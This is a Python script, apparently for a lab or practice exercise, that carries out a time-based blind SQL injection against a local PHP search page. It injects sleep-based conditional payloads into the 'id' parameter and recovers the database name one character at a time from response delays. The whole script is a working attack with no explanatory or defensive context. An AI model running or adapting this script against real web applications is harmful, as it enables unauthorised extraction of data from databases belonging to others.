#!/usr/bin/python3

import requests
import signal
import sys
import time
import string
from pwn import *

def def_handler(sig, frame):
    print("\n\n[!] Exiting... \n")
    sys.exit(1)

# Ctrl + C handler
signal.signal(signal.SIGINT, def_handler)

# Global variables
main_url = "http://localhost/searchUsers.php"
characters = string.printable

def makeSQLI():

    p1 = log.progress("Brute Force")
    p1.status("Starting brute force process")

    time.sleep(2)

    p2 = log.progress("Extracted Data")

    extracted_info = ""

    for position in range(1, 150):
        for character in range(33, 126):
            sqli_url = main_url + "?id=1000000 or if(ascii(substr(database(),%d,1))=%d,sleep(0.35),1)" % (position, character)

            p1.status(sqli_url)

            time_start = time.time()
            r = requests.get(sqli_url)
            time_end = time.time()

            if time_end - time_start > 0.35:
                extracted_info += chr(character)
                p2.status(extracted_info)
                break

if __name__ == '__main__':
    makeSQLI()
